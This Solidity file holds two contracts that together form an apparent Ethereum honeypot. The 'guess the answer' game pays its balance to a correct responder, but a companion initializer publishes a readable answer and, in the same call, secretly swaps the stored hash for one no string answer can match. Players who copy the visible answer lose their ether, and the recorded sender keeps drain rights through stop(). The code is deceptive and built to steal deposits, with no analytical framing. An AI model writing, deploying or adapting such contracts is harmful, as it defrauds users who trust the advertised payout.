// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract GuessMyAnswerFromEtherscan {
    uint256 private constant _version = 1;

    string public q;
    address private sender;
    bytes32 private secretHash;

    address private immutable _your_team_account;

    constructor() public payable {
        _your_team_account = msg.sender;
    }

    modifier onlyYourTeam() {
        require(msg.sender == _your_team_account, "not-your-team-account");
        _;
    }

    function answer(string memory _response) external payable {
        if (
            secretHash == keccak256(abi.encode(_response)) &&
            msg.value > 0.01 ether
        ) {
            msg.sender.transfer(address(this).balance);
        }
        require(msg.sender == tx.origin);
    }

    function initAnswer(string calldata _q, string calldata _response)
        public
        payable
    {
        if (secretHash == 0x0) // Not initialized yet
        {
            secretHash = keccak256(abi.encode(_response));
            q = _q;
            sender = msg.sender;
        }
    }

    function stop() public payable {
        require(msg.sender == sender);
        msg.sender.transfer(address(this).balance);
    }

    function addQuestion(string calldata _q, bytes32 _secretHash)
        public
        payable
    {
        require(msg.sender == sender);
        q = _q;
        secretHash = _secretHash;
    }
}

interface IG {
    function initAnswer(string calldata _q, string calldata _response) external;

    function addQuestion(string calldata _q, bytes32 _secretHash) external;
}

contract InitializeAnswer {
    uint256 private constant _version = 1;
    address private immutable _admin_deployer;

    constructor() public payable {
        _admin_deployer = msg.sender;
    }

    function initAnswer(
        address[] calldata contracts,
        string calldata _q,
        string calldata _response
    ) external {
        for (uint256 i; i < contracts.length; ++i) {
            IG(contracts[i]).initAnswer(_q, _response);
            IG(contracts[i]).addQuestion(_q, keccak256(abi.encode(12345)));
        }
    }
}
